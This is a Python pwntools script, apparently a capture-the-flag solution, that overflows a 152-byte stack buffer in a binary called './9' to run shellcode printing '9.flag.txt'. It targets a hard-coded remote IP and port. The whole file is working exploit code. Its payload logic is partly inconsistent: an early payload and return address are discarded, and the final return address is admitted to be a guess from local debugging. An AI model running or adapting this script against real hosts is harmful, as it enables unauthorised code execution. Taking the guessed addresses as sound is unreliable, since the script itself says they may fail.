#!/usr/bin/env python3
from pwn import *

elf = context.binary = ELF('./9', checksec=False)
context.arch = 'amd64'
context.os = 'linux'

def conn():
    return remote('52.184.85.16', 12345)

def solve():
    p = conn()

    # 1) Send any initial inputs
    p.sendline(b"13523148")
    p.sendline(b"7")

    # 2) Create shellcode: cat 9.flag.txt
    shellcode = shellcraft.amd64.linux.cat("9.flag.txt")
    assembled = asm(shellcode)

    # 3) Our buffer is 144 bytes + 8 for saved RBP => 152 total
    offset = 152

    # 4) Place the shellcode at the start of the buffer
    #    Then overwrite saved RIP to jump to the start (RSP at time of 'gets')
    payload  = assembled
    payload += b"A" * (offset - len(assembled))  # pad to 152
    ret_addr = p64(0x404070)  # Some stack address if you know it,
                              # or just jump to the start of our input
                              # If we assume the input buffer is at &s in main(),
                              # we can guess the return might be near RSP.

    # Trick: If we don't know the exact address, we can try a NOP sled & guess
    # We'll do a simpler approach here:
    # We can guess the buffer is at RSP after 'gets'. Then we do:
    # payload += p64(<stack address of your shellcode>)

    # However, if we do not have an exact stack address, we might bruteforce or
    # rely on the fact that there's no ASLR (No PIE + child process offset).
    # For a guaranteed approach, attach GDB locally to find the buffer address.

    # For demonstration, let's assume we found a stack address in GDB or the binary
    # is extremely stable. We'll guess we land at RSP + 0x50 or so after calling gets.
    # A more robust approach uses a GDB approach to confirm.

    # Let's do a small NOP sled at the start
    nop_sled = b"\x90" * 32
    shellcode = nop_sled + asm(shellcraft.amd64.linux.cat("9.flag.txt"))
    payload   = shellcode.ljust(offset, b"A")
    # Overwrite RIP with the start of the buffer. Suppose it's at RSP-0x90 from saved RIP, etc.

    # In a local exploit, you'd do `gdb.attach(p)` and check the address of 's' in main().
    # For now, let's guess a typical offset for a 64-bit non-PIE with no ASLR:
    # (This guess might or might not work on the remote. It's just a template.)
    ret_addr = p64(0x7fffffffe410)  # Example from local debugging

    final_payload = payload + ret_addr

    p.sendline(final_payload)
    p.interactive()

if __name__ == "__main__":
    solve()
